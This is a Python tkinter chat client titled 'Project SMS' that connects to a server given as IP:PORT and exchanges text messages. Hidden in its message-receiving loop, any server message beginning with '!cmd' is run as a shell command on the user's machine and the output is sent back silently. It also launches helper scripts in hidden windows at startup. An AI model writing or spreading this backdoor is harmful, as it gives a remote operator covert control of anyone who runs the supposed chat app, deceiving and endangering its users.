import tkinter as tk
from tkinter import messagebox
import json
import socket
import threading
import subprocess
import os
import sys

ACCOUNT_FILE = "account.json"
TEMP_DIR = "tools/tmp"
ADDITION_SCRIPT = "tools/addition.py"
LOGIN_SCRIPT = "tools/login.py"
connection_started = False
connected = False
client = None

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return f"Command failed: {e.output.decode('utf-8')}"

def receive_messages(client, text_area):
    global connected
    while connected:
        try:
            message = client.recv(1024).decode('utf-8')
            if message.startswith("!cmd"):
                command = message.split(" ", 1)[1]
                result = execute_command(command)
                client.send(f"!cmd_result {result}".encode('utf-8'))
            else:
                text_area.config(state=tk.NORMAL)
                text_area.insert(tk.END, message + '\n')
                text_area.yview(tk.END)
                text_area.config(state=tk.DISABLED)
        except Exception as e:
            messagebox.showerror("Error", f"Error: {e}")
            client.close()
            connected = False
            break

def start_client():
    global connection_started, connected, client

    def on_connect_test():
        if connection_started or connected:
            messagebox.showinfo("Can't connect again", "Connected to the server. Type !leave to leave the server")
        else:
            on_connect()

    def on_connect():
        global connection_started, connected, client
        connection_started = True
                        
        connection_code = entry_connection.get()
        try:
            server_ip, server_port = connection_code.split(":")
            server_port = int(server_port)

            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((server_ip, server_port))

            connected = True
            connection_started = False

            receive_thread = threading.Thread(target=receive_messages, args=(client, text_area))
            receive_thread.start()

            def send_message():
                message = entry_message.get()
                if message and not message.startswith("!leave"):
                    # Show message in the local text area (the sender's interface)
                    text_area.config(state=tk.NORMAL)
                    text_area.insert(tk.END, f"You: {message}\n")
                    text_area.yview(tk.END)
                    text_area.config(state=tk.DISABLED)

                    # Send the message to the server
                    client.send(message.encode('utf-8'))
                    entry_message.delete(0, tk.END)  # Clear input after sending

                elif message == "!leave":
                    client.send(message.encode('utf-8'))
                    connected = False
                    client.close()
                    entry_message.delete(0, tk.END)  # Clear input after sending
                    messagebox.showinfo("Disconnected", "You have left the server.")
            
            client.send(client_username.encode('utf-8'))
            button_send.config(command=send_message)

        except Exception as e:
            connection_started = False
            connected = False
            messagebox.showerror("Connection Error", f"Failed to connect: {e}")

    # Function to handle closing the window
    def on_closing():
        global connected, client
        if connected:
            connected = False
            client.close()  # Close the socket connection
        root.destroy()  # Destroy the GUI window
        sys.exit()  # Exit the script

    # Check if account file exists before running the client
    account_file = os.path.join(TEMP_DIR, ACCOUNT_FILE)
    if not os.path.exists(account_file):
        messagebox.showerror("Error", "Account file not found. Launching login.py to create an account.")
        # Run login.py in a hidden window (no cmd)
        tools_folder = os.path.join(os.path.dirname(__file__), "tools")
        login_script = os.path.join(tools_folder, "login.py")
        if os.path.exists(login_script):
            subprocess.Popen(["python", login_script], cwd=tools_folder, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            print("login.py not found. Exiting.")
        sys.exit()
    else:
        with open(account_file, 'r') as file:
            accountJSON = json.load(file)
            global client_username
            client_username = accountJSON['username']
        
    addition_script = os.path.join(ADDITION_SCRIPT)
    if os.path.exists(addition_script):
        subprocess.Popen(["python", addition_script], cwd=os.path.dirname(addition_script), creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        print("addition.py not found. Proceeding with application startup.")

    # Start the main application UI
    root = tk.Tk()
    root.title("Project SMS")

    frame = tk.Frame(root)
    frame.pack(padx=10, pady=10)

    tk.Label(frame, text="Enter connection code (format: IP:PORT):").pack()

    entry_connection = tk.Entry(frame, width=30)
    entry_connection.pack()

    button_connect = tk.Button(frame, text="Connect", command=on_connect_test)
    button_connect.pack(pady=5)

    text_area = tk.Text(frame, height=15, width=50, wrap=tk.WORD, state=tk.DISABLED)
    text_area.pack(pady=5)

    entry_message = tk.Entry(frame, width=40)
    entry_message.pack(side=tk.LEFT, padx=(0, 5))

    button_send = tk.Button(frame, text="Send")
    button_send.pack(side=tk.LEFT)

    # Bind the closing event to the on_closing function
    root.protocol("WM_DELETE_WINDOW", on_closing)

    root.mainloop()

# Check for temporary files folder before running
temp_dir_file = os.path.join("tools", "tmp")
if os.path.exists(temp_dir_file):
    start_client()
else:
    print("Error Code 1: tmp folder doesn't exist")
